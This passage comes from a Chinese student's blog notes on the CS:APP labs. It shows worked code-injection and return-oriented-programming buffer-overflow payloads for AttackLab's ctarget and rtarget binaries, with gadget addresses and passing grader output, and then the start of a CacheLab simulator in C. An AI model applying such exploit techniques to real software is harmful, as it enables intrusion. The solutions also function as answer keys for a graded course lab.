class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>		;代码</span><br><span class="line"><span class="number">0x5561dcb8</span>:		<span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>		;字符串</span><br></pre></td></tr></table></figure>

<p>观察知字符串首地址为<code>0x5561dcb8</code>，故最终文本为</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line">a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> c7 c7 b8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target<span class="number">1</span>$ ./hex<span class="number">2</span>raw &lt; ctarget<span class="number">3</span>.txt | ./ctarget -q</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa</span><br><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">3</span>!: You called touch<span class="number">3</span>(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">3</span> with target ctarget</span><br><span class="line"><span class="attribute">PASS</span>: Would have posted the following:</span><br><span class="line">	<span class="attribute">user</span> id	bovik</span><br><span class="line">	<span class="attribute">course</span>	<span class="number">15213</span>-f<span class="number">15</span></span><br><span class="line">	<span class="attribute">lab</span>	attacklab</span><br><span class="line">	<span class="attribute">result</span>	<span class="number">1</span>:PASS:<span class="number">0</span>xffffffff:ctarget:<span class="number">3</span>:<span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> A<span class="number">8</span> DC <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">48</span> C<span class="number">7</span> C<span class="number">7</span> B<span class="number">8</span> DC <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> FA <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> C<span class="number">3</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> </span><br></pre></td></tr></table></figure>

<h2 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h2><p>思路：要想办法将<code>cookie</code>值传给<code>%rdi</code>寄存器，首先将该该值放于堆栈中一处，三种可选指令里只有<code>popq</code>指令能做到将堆栈中的值赋予寄存器，若能直接<code>popq %rdi</code>则皆大欢喜，若不能则需先将<code>cookie</code>值存于某一寄存器中，再通过<code>movq</code>指令将该值传入<code>%rdi</code>寄存器，最后调用<code>touch2()</code>函数实现最终目的</p>
<p>按照教学文档提示，在<code>start_farm()</code>和<code>mid_farm()</code>间寻找<code>movq X, %rdi</code>型字节码（<code>48 89 xx</code>），且该条指令之后立即跟上<code>nop</code>字节码（<code>90</code>）或<code>retq</code>字节码（<code>c3</code>），唯一的一条满足以上条件的指令在<code>setval_426()</code>函数中，首地址为<code>0x4019c5</code>，该指令实现<code>movq %rax, %rdi</code>，于是知应先将<code>cookie</code>值存于<code>%rax</code>寄存器中，即使用<code>popq %rax</code>指令，于是接着在<code>addval_219()</code>函数中地址为<code>0x4019ab</code>处寻得该指令</p>
<p>综上易得正确文本</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target<span class="number">1</span>$ ./hex<span class="number">2</span>raw &lt; rtarget<span class="number">1</span>.txt | ./rtarget -q</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa</span><br><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">2</span>!: You called touch<span class="number">2</span>(<span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa)</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">2</span> with target rtarget</span><br><span class="line"><span class="attribute">PASS</span>: Would have posted the following:</span><br><span class="line">	<span class="attribute">user</span> id	bovik</span><br><span class="line">	<span class="attribute">course</span>	<span class="number">15213</span>-f<span class="number">15</span></span><br><span class="line">	<span class="attribute">lab</span>	attacklab</span><br><span class="line">	<span class="attribute">result</span>	<span class="number">1</span>:PASS:<span class="number">0</span>xffffffff:rtarget:<span class="number">2</span>:<span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> AB <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FA <span class="number">97</span> B<span class="number">9</span> <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> C<span class="number">5</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> EC <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure>

<h2 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h2><p><code>Phase 5</code>感觉比前四个难不少。首先我将从<code>start_farm()</code>到<code>end_farm()</code>内所有的函数的字节码全记在一张纸上，根据说明文档的<code>Figure</code>筛选出有用<code>gadget</code>如下（已剔除重复指令）</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addval_<span class="number">273</span><span class="comment">()</span>: movq <span class="meta">%</span>rax, <span class="meta">%</span>rdi</span><br><span class="line">addval_<span class="number">273</span><span class="comment">()</span>: movl <span class="meta">%</span>eax, <span class="meta">%</span>edi</span><br><span class="line">getval_<span class="number">481</span><span class="comment">()</span>: movl <span class="meta">%</span>eax, <span class="meta">%</span>edx</span><br><span class="line">addval_<span class="number">190</span><span class="comment">()</span>: movq <span class="meta">%</span>rsp, <span class="meta">%</span>rax</span><br><span class="line">addval_<span class="number">190</span><span class="comment">()</span>: movl <span class="meta">%</span>esp, <span class="meta">%</span>eax</span><br><span class="line">getval_<span class="number">159</span><span class="comment">()</span>: movl <span class="meta">%</span>edx, <span class="meta">%</span>ecx</span><br></pre></td></tr></table></figure>

<img src="/2021/04/05/CSAPP-Labs/attacklab_1.jpg" class>

<p>最开始尝试在所有函数中寻找是否有指令序列正好与待传送的<code>cookie</code>字符串值相等，但没找到。因为可用的只有<code>mov</code>和<code>pop</code>两类指令，条件限制严格，遂尝试寻找一个指令序列，先执行<code>mov</code>，接着执行<code>pop</code>，再调用<code>ret</code></p>
<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq <span class="keyword">X</span>, <span class="keyword">Y</span></span><br><span class="line">pop <span class="keyword">Z</span></span><br></pre></td></tr></table></figure>

<p>两条连着的指令，即机器码形如</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">89 </span>xx <span class="number">5</span>x</span><br></pre></td></tr></table></figure>

<p>若存在满足上述条件的指令序列，则可尝试通过前一句的<code>mov</code>指令将字符串首地址传在某寄存器中，同时<code>pop</code>指令跳过我们混合在代码中的字符串，但并不存在满足上述条件的指令。一度陷入迷茫。参考他人题解后方知有一重要信息没利用到</p>
<p>在这一堆<code>getval_xxx()</code>，<code>setval_xxx()</code>和<code>addval_xxx()</code>里，有一个特殊的函数：<code>add_xy()</code>，这个函数将<code>%rdi</code>寄存器和<code>%rsi</code>寄存器里的值相加，结果保存在<code>%rax</code>寄存器中，而我们又有一个唯一可用的的<code>pop</code>型指令<code>popq %rax</code>，结合能用的几种指令，想出如下办法（见图片右上角）</p>
<img src="/2021/04/05/CSAPP-Labs/attacklab_2.jpg" class>

<p>得输入序列</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line"><span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>测试答案</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target<span class="number">1</span>$ ./hex<span class="number">2</span>raw &lt; rtarget<span class="number">2</span>.txt | ./rtarget -q</span><br><span class="line"><span class="attribute">Cookie</span>: <span class="number">0</span>x<span class="number">59</span>b<span class="number">997</span>fa</span><br><span class="line"><span class="attribute">Type</span> string:Touch<span class="number">3</span>!: You called touch<span class="number">3</span>(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line"><span class="attribute">Valid</span> solution for level <span class="number">3</span> with target rtarget</span><br><span class="line"><span class="attribute">PASS</span>: Would have posted the following:</span><br><span class="line">	<span class="attribute">user</span> id	bovik</span><br><span class="line">	<span class="attribute">course</span>	<span class="number">15213</span>-f<span class="number">15</span></span><br><span class="line">	<span class="attribute">lab</span>	attacklab</span><br><span class="line">	<span class="attribute">result</span>	<span class="number">1</span>:PASS:<span class="number">0</span>xffffffff:rtarget:<span class="number">3</span>:<span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">30</span> AB <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> DD <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">34</span> <span class="number">1</span>A <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">13</span> <span class="number">1</span>A <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">06</span> <span class="number">1</span>A <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A<span class="number">2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> D<span class="number">6</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A<span class="number">2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FA <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> </span><br></pre></td></tr></table></figure>

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>总的来说,<code>attacklab</code>的五个<code>phase</code>难度都不很大。能有机会做一次“黑客”还是挺酷的，通过使用<code>CI</code>和<code>ROP</code>方法对程序进行缓冲区溢出攻击，更能深刻体会限制缓存区长度、对程序各种可能的输入的周全考虑必要性。</p>
<h1 id="CacheLab"><a href="#CacheLab" class="headerlink" title="CacheLab"></a>CacheLab</h1><h2 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h2><p>说实话这部分给我带来的挑战感觉并不很大，感觉自己逻辑是对的但检查来检查去就是得不到预期答案，哪怕参考他人代码核对后仍然觉得自己的没问题，实在是过于折磨……</p>
<p>因为我是把整本书全看完才开始做这个实验的，而这一部分涉及文件读取，我一上来就想到了使用第十章中学到的<code>dup2()</code>函数将标准输入重定向到文件，再尝试<code>scanf()</code>读入，但不知为何就是不停报错<code>Segmentation fault</code>，检查多次修改多处仍不能正常运行，遂参考他人思路，利用<code>fgets()</code>逐行读入数据再逐字符分析，最终版本如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXBUF 128					<span class="comment">/* 缓冲区大小 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDX(m, n, E) m * E + n		<span class="comment">/* 计算m行n列元素位置 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">(<span class="keyword">char</span> *argv[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load_store</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">unsigned</span> tag, <span class="keyword">unsigned</span> index, <span class="keyword">unsigned</span> offset, <span class="keyword">unsigned</span> size, <span class="keyword">int</span> E)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hextodec</span><span class="params">(<span class="keyword">char</span> c)</span></span>;				<span class="comment">/* 十六进制转十进制 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span> buf[])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count = <span class="number">0</span>, miss_count = <span class="number">0</span>, eviction_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v = <span class="number">0</span>;							<span class="comment">/* v代表是否开启详细显示模式 */</span></span><br><span class="line"><span class="keyword">char</span> buffer[MAXBUF];				<span class="comment">/* 读取缓冲区 */</span></span><br><span class="line">FILE *fp;							</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> valid;						<span class="comment">/* 有效位 */</span></span><br><span class="line">	<span class="keyword">int</span> tag;</span><br><span class="line">	<span class="keyword">int</span> count;						<span class="comment">/* count值越大，说明最近被使用 */</span></span><br><span class="line">&#125;unit;								<span class="comment">/* 一个unit单元即为cache中一行 */</span></span><br><span class="line">unit* cache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> opt;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> s = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, s_pow = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="keyword">switch</span>(opt) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span 